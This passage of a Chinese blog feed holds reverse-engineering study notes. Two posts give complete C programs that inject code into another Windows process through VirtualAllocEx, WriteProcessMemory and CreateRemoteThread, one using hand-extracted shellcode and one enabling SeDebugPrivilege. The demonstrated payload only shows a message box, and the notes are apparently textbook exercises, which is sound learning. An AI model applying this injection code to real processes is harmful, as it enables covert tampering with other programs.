    
    <entry>
      <title>使用汇编语言编写注入代码</title>
      <link href="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/"/>
      <url>/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-设置"><a href="#0x00-设置" class="headerlink" title="0x00-设置"></a>0x00-设置</h1><p>修改EIP</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649925411946.png"></p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649925229842.png"></p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649925283278.png" alt="关闭自动填充nop"></p><h1 id="0x01-修改汇编"><a href="#0x01-修改汇编" class="headerlink" title="0x01-修改汇编"></a>0x01-修改汇编</h1><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649926048838.png"></p><p>输入字符串，Ctrl+E修改，注意字符串以0结尾，最后要加上00</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649926227498.png"></p><p>可以发现得到的是汇编代码，OD会自动识别</p><p>只需要选中字符串按下Ctrl+A即可转为字符串</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649926333629.png"></p><p>同理修改好<a href="http://www.reversecore.com字符串/">www.reversecore.com字符串</a></p><h2 id="提取汇编"><a href="#提取汇编" class="headerlink" title="提取汇编"></a>提取汇编</h2><p>接下来将插入的asm的机器码进行复制（在内存窗口中复制对应长度的十六进制数据），并修改格式</p><p>得到</p><pre class="language-c" data-language="c"><code class="language-c">char shellcode[] = {0x55,0x8B,0xEC,0x8B,0x75,0x08,0x68,0x6C,0x6C,0x00,0x00,0x68,0x33,0x32,0x2E,0x64,0x68,0x75,0x73,0x65,0x72,0x54,0xFF,0x16,0x68,0x6F,0x78,0x41,0x00,0x68,0x61,0x67,0x65,0x42,0x68,0x4D,0x65,0x73,0x73,0x54,0x50,0xFF,0x56,0x04,0x6A,0x00,0xE8,0x0C,0x00,0x00,0x00,0x52,0x65,0x76,0x65,0x72,0x73,0x65,0x43,0x6F,0x72,0x65,0x00,0xE8,0x14,0x00,0x00,0x00,0x77,0x77,0x77,0x2E,0x72,0x65,0x76,0x65,0x72,0x73,0x65,0x63,0x6F,0x72,0x65,0x2E,0x63,0x6F,0x6D,0x00,0x6A,0x00,0xFF,0xD0,0x33,0xC0,0x8B,0xE5,0x5D,0xC3};</code></pre><h1 id="0x02-代码实现"><a href="#0x02-代码实现" class="headerlink" title="0x02-代码实现"></a>0x02-代码实现</h1><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include&lt;Windows.h&gt;#include&lt;string.h&gt;BYTE shellcode[] = { 0x55,0x8B,0xEC,0x8B,0x75,0x08,0x68,0x6C,0x6C,0x00,0x00,0x68,0x33,0x32,0x2E,0x64,0x68,0x75,0x73,0x65,0x72,0x54,0xFF,0x16,0x68,0x6F,0x78,0x41,0x00,0x68,0x61,0x67,0x65,0x42,0x68,0x4D,0x65,0x73,0x73,0x54,0x50,0xFF,0x56,0x04,0x6A,0x00,0xE8,0x0C,0x00,0x00,0x00,0x52,0x65,0x76,0x65,0x72,0x73,0x65,0x43,0x6F,0x72,0x65,0x00,0xE8,0x14,0x00,0x00,0x00,0x77,0x77,0x77,0x2E,0x72,0x65,0x76,0x65,0x72,0x73,0x65,0x63,0x6F,0x72,0x65,0x2E,0x63,0x6F,0x6D,0x00,0x6A,0x00,0xFF,0xD0,0x33,0xC0,0x8B,0xE5,0x5D,0xC3};typedef struct _Thread_Param{FARPROC pFunc[2];//Loadlibrary,GetProcAddress}Thread_Param, * pThread_Param;void Asm_Inject(DWORD PID){HMODULE hMod = NULL;HANDLE hProcess = NULL;Thread_Param param[2] = { 0, };HANDLE hThread = NULL;LPVOID pRemoteBuf[2] = { 0, };//获取kernel32.dll的句柄hMod = GetModuleHandleA("kernel32.dll");//将需要使用的函数存储param-&gt;pFunc[0] = GetProcAddress(hMod, "LoadLibraryA");param-&gt;pFunc[1] = GetProcAddress(hMod, "GetProcAddress");//开启进程if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID))){printf("Open Failed!!Error Code:%d\n", GetLastError());return;}//开辟空间并写入if (!(pRemoteBuf[0] = VirtualAllocEx(hProcess, NULL, sizeof(Thread_Param), MEM_COMMIT, PAGE_READWRITE))){printf("VirtualAlloc Failed!!Error Code:%d\n", GetLastError());return;}if (!WriteProcessMemory(hProcess, pRemoteBuf[0], (LPVOID)&amp;param, sizeof(Thread_Param), NULL)){printf("WriteProcess Failed!!Error Code:%d\n", GetLastError());return;}//将我们的shellcode写入if (!(pRemoteBuf[1] = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_READWRITE))){printf("VirtualAlloc Failed!!Error Code:%d\n", GetLastError());return;}if (!WriteProcessMemory(hProcess, pRemoteBuf[1], (LPVOID)&amp;shellcode, sizeof(shellcode), NULL)){printf("WriteProcess Failed!!Error Code:%d\n", GetLastError());return;}hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuf[1], pRemoteBuf[0], 0, NULL);WaitForSingleObject(hThread, INFINITE);CloseHandle(hThread);CloseHandle(hProcess);return;}int main(int argc,char*argv[]){Asm_Inject((DWORD)atol(argv[1]));return 0;}</code></pre><p>本质上和代码注入没区别，主要是我们将字符串也包含在了注入的代码里面，所以在线程函数中不再需要使用字符数组存储</p><h1 id="0x03-分析"><a href="#0x03-分析" class="headerlink" title="0x03-分析"></a>0x03-分析</h1><p>在OD中打开并注入，让其停在新线程</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650001855752.png"></p><p>先提升堆栈，然后将函数的参数存入ESI中，也就是线程函数对应的THREAD_PARAM结构体，因为里面只有两个函数指针，所以大小为0x8</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002105819.png" alt="ESI的值"></p><p>我们执行完移动到esi这一步，去内存中查看ESI存储的值</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002164069.png"></p><p>将其转为地址，注释中会告知我们其对应的API函数</p><p>接下来的四个PUSH+call可以知道是调用函数，LoadLibraryA只需要一个参数</p><p>前面三个PUSH是将函数名称压入栈，而最后一个是将当前的ESP的值压入栈，而当前ESP的值正好是存储字符串的地址，这样就实现了给LoadLibraryA传参</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002382351.png"></p><p>需要注意这里是小端序</p><p>接下来的四个PUSH和前面是一样的，关键是最后一个PUSH</p><blockquote><p><strong>因为返回值一般存储在EAX，并且函数调用时入栈顺序是从右往左依次入栈</strong></p></blockquote><p>这里的EAX存储的值就是user32.dll的句柄，也就是地址，在eax寄存器中OD也自动标明了</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002603450.png"></p><p>最后获取到MessageBoxA的地址</p><p>MessageBoxA的传参</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002654110.png"></p><p>这一段本来是字符串，但是OD给我们识别成了代码</p><p>执行完之后</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002721021.png"></p><p>可以看到我们的MessageBoxA的参数都在栈中了</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002770898.png" alt="调用MessageBoxA"></p><p>最后就是清空eax和恢复堆栈了</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加密与解密第四版</title>
      <link href="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/"/>
      <url>/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-基础知识"><a href="#0x00-基础知识" class="headerlink" title="0x00-基础知识"></a>0x00-基础知识</h1><h2 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h2><p><img src="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/1649814834555.png"></p><h2 id="大小端序"><a href="#大小端序" class="headerlink" title="大小端序"></a>大小端序</h2><p><img src="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/1649814898304.png"></p><h2 id="Windows操作系统"><a href="#Windows操作系统" class="headerlink" title="Windows操作系统"></a>Windows操作系统</h2><p><img src="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/1649814924513.png" alt="重要DLL"></p><p><img src="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/1649814970448.png" alt="Unicode与ANSI函数"></p><h2 id="WOW64"><a href="#WOW64" class="headerlink" title="WOW64"></a>WOW64</h2><p>WOW64是64位Windows操作系统的子系统，可以使大多数32位应用程序在不修改的情况下运行在64位操作系统上</p><p><img src="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/1649815151630.png" alt="WOW64操作过程"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows核心编程</title>
      <link href="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/"/>
      <url>/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-错误处理"><a href="#0x00-错误处理" class="headerlink" title="0x00-错误处理"></a>0x00-错误处理</h1><p>在WinError.h头文件中包含了Microsoft定义的错误代码列表，每个错误都有三种表示：一个消息ID(一个可在源代码使用的宏，用于与GetLastError的返回值进行比较)、消息文本(描述错误的英文文本)和一个编号(应该避免使用此编号，尽量使用消息ID)</p><p>所以在Windows函数失败之后，应该立马调用GetLastError()</p><h1 id="0x01-字符和字符串处理"><a href="#0x01-字符和字符串处理" class="headerlink" title="0x01-字符和字符串处理"></a>0x01-字符和字符串处理</h1><h2 id="ANSI与UNCODE"><a href="#ANSI与UNCODE" class="headerlink" title="ANSI与UNCODE"></a>ANSI与UNCODE</h2><blockquote><p>在Windows Vista中，每个Unicode字符都使用UTF-16编码，UTF-16将每个字符编码为2个字节也就是16位</p></blockquote><p>我们知道在C语言中，char数据类型表示一个8位ANSI字符，也就是一个字节</p><p>当我们声明Unicode字符和字符串时，只需要在字符串前加上”L“，表示以UTF-16来编码每个字符</p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1649813453705.png"></p><h2 id="Unicode函数与ANSI函数"><a href="#Unicode函数与ANSI函数" class="headerlink" title="Unicode函数与ANSI函数"></a>Unicode函数与ANSI函数</h2><p>自Windows NT起，Windows所有的版本都完全用Unicode来构建。也就是说所有核心函数(创建窗口、显示文本、进行字符串处理)都需要Unicode字符串</p><p>在Windows中，Windows函数通常具有两个版本，用于接收不同的字符串</p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1649813717040.png"></p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1649813766466.png" alt="默认版本"></p><h2 id="C运行库中的Unicode函数和ANSI函数"><a href="#C运行库中的Unicode函数和ANSI函数" class="headerlink" title="C运行库中的Unicode函数和ANSI函数"></a>C运行库中的Unicode函数和ANSI函数</h2><p>和Windows函数一样，C运行库提供了一系列函数处理ANSI字符和字符串，并提供了一系列函数来处理Unicode字符与字符串</p><p>在C运行库中，strlen就是一个能返回ANSI字符串长度的函数。与之对应的是wcslen，这个C运行库函数能返回Unicode字符串的长度，这两个函数都在string.h中</p><h2 id="C运行库中的安全字符串函数"><a href="#C运行库中的安全字符串函数" class="headerlink" title="C运行库中的安全字符串函数"></a>C运行库中的安全字符串函数</h2><blockquote><p><strong>任何修改字符串的函数都存在一个安全隐患：如果目标字符串缓冲区不够大，无法容纳所生成的字符串，就会导致内存中的数据被破坏</strong></p></blockquote><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650011578747.png" alt="例子"></p><p>为了防止被被恶意软件肆意滥用，微软提供了一系列新的函数来取代C运行库的不安全的字符串处理函数</p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650011917625.png"></p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650012022950.png"></p><p>书中没有详细介绍，可以自行查找</p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650012306710.png" alt="安全字符串函数"></p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650012361902.png" alt="安全字符串函数执行"></p><h1 id="Windows字符串函数"><a href="#Windows字符串函数" class="headerlink" title="Windows字符串函数"></a>Windows字符串函数</h1><p>不知道讲了些啥</p><h2 id="为何要用Unicode"><a href="#为何要用Unicode" class="headerlink" title="为何要用Unicode"></a>为何要用Unicode</h2><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650012784209.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码注入</title>
      <link href="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00-前言"></a>0x00-前言</h1><p>感觉《逆向工程核心原理》只是进行了一点介绍，但是我理解能力有限</p><p>于是翻阅到了这篇文章</p><p><a href="https://www.52pojie.cn/thread-1270499-1-1.html">https://www.52pojie.cn/thread-1270499-1-1.html</a></p><h1 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01-原理"></a>0x01-原理</h1><p>在DLL注入中，我们通过远程线程在目标进程中调用LoadLibraryA()函数加载我们的DLL</p><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649738932188.png"></p><p>实际上只要我们定义的函数符合CreateRemoteThread参数中定义的函数模板，就可以通过远程线程的方式去执行它，而不限于LoadLibraryA</p><pre class="language-c" data-language="c"><code class="language-c">DWORD WINAPI ThreadProc(  _In_ LPVOID lpParameter);</code></pre><p>所以我们只要定义一个只有一个参数的函数，把它转换成 LPTHREAD_START_ROUTINE（CreateRemoteThread的参数）即可。</p><p>但是这里产生了一个问题，如果我们的函数具有多个参数怎么办呢，要成功调用函数的话，我们的参数也需要在目标进程的虚拟内存中</p><blockquote><p>对于将我们的参数写入虚拟内存中，我们可以使用VirtualAllocEx函数向目标申请内存虚拟空间</p><p>对于多个参数，我们可以构建一个结构体存放所有的参数，然后在调用的时候通过内存偏移来访问参数</p></blockquote><pre class="language-c" data-language="c"><code class="language-c">typedef struct _INJECT_DATA{    char lpText[8];  //参数1    char lpCaption[8];  //参数2}INJECT_DATA;</code></pre><p>下面以MessageBoxA函数为例</p><h2 id="定义函数指针"><a href="#定义函数指针" class="headerlink" title="定义函数指针"></a>定义函数指针</h2><p>首先先进行定义我们要使用到的函数指针</p><p>因为我们要调用user32.dll中的MessageBoxA，所以要使用LoadLibraryA()加载user32.dll，并且使用GetProcAddress()获取MessageBoxA的函数地址</p><pre class="language-c" data-language="c"><code class="language-c">//定义函数指针，方便调用HOMDULE是返回值，WINAPI也就是__stdcall，是调用约定，类型名为PFLOADLIBRARYA，lpLivFileName是参数typedef HMODULE(WINAPI *PFLOADLIBRARYA)(LPCSTR lpLibFileName);//前面的是返回值，中间是类型typedef FARPROC(WINAPI *PFGETPROCADDRESS)(HMODULE hModule,LPCSTR lpProcName);//返回值是一个回调函数typedef int (WINAPI *PFMESSAGEBOXA)(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType);</code></pre><h2 id="定义线程信息块"><a href="#定义线程信息块" class="headerlink" title="定义线程信息块"></a>定义线程信息块</h2><p>使用结构体存储我们要调用的函数信息</p><pre class="language-c" data-language="c"><code class="language-c">//创建一个存储线程信息的结构体typedef struct _THREAD_PARAM//定义线程信息{    FARPROC pFunc[2];               // LoadLibraryA(), GetProcAddress()      char    szBuf[4][128];          // "user32.dll", "MessageBoxA", "Inject Success!!", "Hint"  } THREAD_PARAM, * PTHREAD_PARAM;//分别是线程信息块和指向线程信息的指针</code></pre><h2 id="线程信息块赋值"><a href="#线程信息块赋值" class="headerlink" title="线程信息块赋值"></a>线程信息块赋值</h2><pre class="language-c" data-language="c"><code class="language-c">hMod = GetModuleHandleA("kernel32.dll");//先给线程信息块赋值 param.pFunc[0] = GetProcAddress(hMod, "LoadLibraryA");param.pFunc[1] = GetProcAddress(hMod, "GetProcAddress");//因为kernel32在内存中优先被装载，所以在不同进程中都一样strcpy_s(param.szBuf[0], "user32.dll");strcpy_s(param.szBuf[1], "MessageBoxA");strcpy_s(param.szBuf[2], "InjectCode Success!!");strcpy_s(param.szBuf[3], "Hint");</code></pre><h2 id="打开目标进程"><a href="#打开目标进程" class="headerlink" title="打开目标进程"></a>打开目标进程</h2><pre class="language-c" data-language="c"><code class="language-c">//开启进程      if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwPID)))                  {        printf("OpenProcess() fail : err_code = %d\n", GetLastError());        return FALSE;    }</code></pre><h2 id="开辟内存并写入线程信息"><a href="#开辟内存并写入线程信息" class="headerlink" title="开辟内存并写入线程信息"></a>开辟内存并写入线程信息</h2><p>第一次写入的是线程函数要调用的函数信息</p><pre class="language-c" data-language="c"><code class="language-c">//为注入的线程信息块中的第一个函数开辟内存     dwSize = sizeof(THREAD_PARAM);    if (!(pRemoteBuf[0] = VirtualAllocEx(hProcess,NULL,dwSize,MEM_COMMIT,PAGE_READWRITE)))        {        printf("VirtualAllocEx() fail : err_code = %d\n", GetLastError());        return FALSE;    }    //写入线程信息块中函数的值和参数到进程中    if (!WriteProcessMemory(hProcess,pRemoteBuf[0],(LPVOID)&amp;param,dwSize,NULL))    {        printf("WriteProcessMemory() fail : err_code = %d\n", GetLastError());        return FALSE;    }</code></pre><p>第二次将线程函数写入内存</p><pre class="language-c" data-language="c"><code class="language-c">//再次开辟      dwSize = (DWORD)InjectCode - (DWORD)ThreadProc;    if (!(pRemoteBuf[1] = VirtualAllocEx(hProcess,NULL,dwSize,MEM_COMMIT,PAGE_EXECUTE_READWRITE)))    {        printf("VirtualAllocEx() fail : err_code = %d\n", GetLastError());        return FALSE;    }    //函数调用    if (!WriteProcessMemory(hProcess,pRemoteBuf[1],(LPVOID)ThreadProc,dwSize,NULL))    {        printf("WriteProcessMemory() fail : err_code = %d\n", GetLastError());        return FALSE;    }</code></pre><h2 id="开启远程线程"><a href="#开启远程线程" class="headerlink" title="开启远程线程"></a>开启远程线程</h2><p>在目标线程中开启远程线程</p><pre class="language-c" data-language="c"><code class="language-c">if (!(hThread = CreateRemoteThread(hProcess,NULL,0,(LPTHREAD_START_ROUTINE)pRemoteBuf[1],pRemoteBuf[0],0,NULL)))    {        printf("CreateRemoteThread() fail : err_code = %d\n", GetLastError());        return FALSE;    }</code></pre><h2 id="线程函数实现调用"><a href="#线程函数实现调用" class="headerlink" title="线程函数实现调用"></a>线程函数实现调用</h2><p>开启线程后会调用线程函数，把我们写入进程内存中的信息读取到要调用的函数中，最后实现调用</p><pre class="language-c" data-language="c"><code class="language-c">//这里的WINAPI是调用约定，相当于__stdcall//线程函数，线程开始的地方DWORD WINAPI ThreadProc(LPVOID lParam){    PTHREAD_PARAM   pParam = (PTHREAD_PARAM)lParam;    HMODULE         hMod = NULL;    FARPROC         pFunc = NULL;    // LoadLibrary()，将pFunc[0]强制转换为这样类型的函数指针，pParam-&gt;szBuf[0]是该函数的参数    hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[0])(pParam-&gt;szBuf[0]);    // "user32.dll"，第二个括号内的是函数的参数    if (!hMod)        return 1;    // GetProcAddress()，返回值是回调函数，pFunc就是函数指针    pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[1])(hMod, pParam-&gt;szBuf[1]);  // "MessageBoxA" ，获取到MessageBoxA的地址     if (!pFunc)        return 1;    // MessageBoxA()      ((PFMESSAGEBOXA)pFunc)(NULL, pParam-&gt;szBuf[2], pParam-&gt;szBuf[3], MB_OK);//最后的调用    return 0;}</code></pre><h1 id="0x02-代码实现"><a href="#0x02-代码实现" class="headerlink" title="0x02-代码实现"></a>0x02-代码实现</h1><pre class="language-c" data-language="c"><code class="language-c">#include&lt;string.h&gt;#include "windows.h"  #include "stdio.h" //创建一个存储线程信息的结构体typedef struct _THREAD_PARAM//定义线程信息{    FARPROC pFunc[2];               // LoadLibraryA(), GetProcAddress()      char    szBuf[4][128];          // "user32.dll", "MessageBoxA", "www.reversecore.com", "ReverseCore"  } THREAD_PARAM, * PTHREAD_PARAM;//分别是线程信息块和指向线程信息的指针//定义函数指针，方便调用HOMDULE是返回值，WINAPI也就是__stdcall，是调用约定，类型名为PFLOADLIBRARYA，lpLivFileName是参数typedef HMODULE(WINAPI *PFLOADLIBRARYA)(LPCSTR lpLibFileName);//前面的是返回值，中间是类型typedef FARPROC(WINAPI *PFGETPROCADDRESS)(HMODULE hModule,LPCSTR lpProcName);//返回值是一个回调函数typedef int (WINAPI *PFMESSAGEBOXA)(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType);//这里的WINAPI是调用约定，相当于__stdcall//线程函数，线程开始的地方DWORD WINAPI ThreadProc(LPVOID lParam){    PTHREAD_PARAM   pParam = (PTHREAD_PARAM)lParam;    HMODULE         hMod = NULL;    FARPROC         pFunc = NULL;    // LoadLibrary()，将pFunc[0]强制转换为这样类型的函数指针，pParam-&gt;szBuf[0]是该函数的参数    hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[0])(pParam-&gt;szBuf[0]);    // "user32.dll"，第二个括号内的是函数的参数    if (!hMod)        return 1;    // GetProcAddress()，返回值是回调函数，pFunc就是函数指针    pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[1])(hMod, pParam-&gt;szBuf[1]);  // "MessageBoxA" ，获取到MessageBoxA的地址     if (!pFunc)        return 1;    // MessageBoxA()      ((PFMESSAGEBOXA)pFunc)(NULL, pParam-&gt;szBuf[2], pParam-&gt;szBuf[3], MB_OK);//最后的调用    return 0;}BOOL InjectCode(DWORD dwPID){    HMODULE         hMod = NULL;    THREAD_PARAM    param = { 0, };    HANDLE          hProcess = NULL;    HANDLE          hThread = NULL;    LPVOID          pRemoteBuf[2] = { 0, };    DWORD           dwSize = 0;    hMod = GetModuleHandleA("kernel32.dll");    //先给线程信息块赋值     param.pFunc[0] = GetProcAddress(hMod, "LoadLibraryA");    param.pFunc[1] = GetProcAddress(hMod, "GetProcAddress");//因为kernel32在内存中优先被装载，所以在不同进程中都一样    strcpy_s(param.szBuf[0], "user32.dll");    strcpy_s(param.szBuf[1], "MessageBoxA");    strcpy_s(param.szBuf[2], "InjectCode Success!!");    strcpy_s(param.szBuf[3], "Hint");    //开启进程      if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwPID)))                  {        printf("OpenProcess() fail : err_code = %d\n", GetLastError());        return FALSE;    }    //为注入的线程信息块中的第一个函数开辟内存     dwSize = sizeof(THREAD_PARAM);    if (!(pRemoteBuf[0] = VirtualAllocEx(hProcess,NULL,dwSize,MEM_COMMIT,PAGE_READWRITE)))        {        printf("VirtualAllocEx() fail : err_code = %d\n", GetLastError());        return FALSE;    }    //写入线程信息块中函数的值和参数到进程中    if (!WriteProcessMemory(hProcess,pRemoteBuf[0],(LPVOID)&amp;param,dwSize,NULL))    {        printf("WriteProcessMemory() fail : err_code = %d\n", GetLastError());        return FALSE;    }    //再次开辟      dwSize = (DWORD)InjectCode - (DWORD)ThreadProc;    if (!(pRemoteBuf[1] = VirtualAllocEx(hProcess,NULL,dwSize,MEM_COMMIT,PAGE_EXECUTE_READWRITE)))    {        printf("VirtualAllocEx() fail : err_code = %d\n", GetLastError());        return FALSE;    }    //函数调用    if (!WriteProcessMemory(hProcess,pRemoteBuf[1],(LPVOID)ThreadProc,dwSize,NULL))    {        printf("WriteProcessMemory() fail : err_code = %d\n", GetLastError());        return FALSE;    }    //开启远程线程，LPTHREAD_START_ROUTINE指向一个回调函数，pRemoteBuf[1]是函数，pRemoteBufe[0]是函数的值和参数    if (!(hThread = CreateRemoteThread(hProcess,NULL,0,(LPTHREAD_START_ROUTINE)pRemoteBuf[1],pRemoteBuf[0],0,NULL)))    {        printf("CreateRemoteThread() fail : err_code = %d\n", GetLastError());        return FALSE;    }    WaitForSingleObject(hThread, INFINITE);    CloseHandle(hThread);    CloseHandle(hProcess);    return TRUE;}BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege){    TOKEN_PRIVILEGES tp;    HANDLE hToken;    LUID luid;    if (!OpenProcessToken(GetCurrentProcess(),        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,        &amp;hToken))    {        printf("OpenProcessToken error: %u\n", GetLastError());        return FALSE;    }    if (!LookupPrivilegeValue(NULL,           // lookup privilege on local system          lpszPrivilege,  // privilege to lookup           &amp;luid))        // receives LUID of privilege      {        printf("LookupPrivilegeValue error: %u\n", GetLastError());        return FALSE;    }    tp.PrivilegeCount = 1;    tp.Privileges[0].Luid = luid;    if (bEnablePrivilege)        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;    else        tp.Privileges[0].Attributes = 0;    // Enable the privilege or disable all privileges.      if (!AdjustTokenPrivileges(hToken,        FALSE,        &amp;tp,        sizeof(TOKEN_PRIVILEGES),        (PTOKEN_PRIVILEGES)NULL,        (PDWORD)NULL))    {        printf("AdjustTokenPrivileges error: %u\n", GetLastError());        return FALSE;    }    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)    {        printf("The token does not have the specified privilege. \n");        return FALSE;    }    return TRUE;}int main(int argc, char* argv[]){    DWORD dwPID = 0;    if (argc != 2)    {        printf("\n USAGE  : %s &lt;pid&gt;\n", argv[0]);        return 1;    }    //进程提权    if (!SetPrivilege(SE_DEBUG_NAME, TRUE))        return 1;    //code injection      dwPID = (DWORD)atol(argv[1]);    dwPID = 9432;    InjectCode(dwPID);    return 0;}</code></pre><h1 id="0x03-最终效果"><a href="#0x03-最终效果" class="headerlink" title="0x03-最终效果"></a>0x03-最终效果</h1><p><img 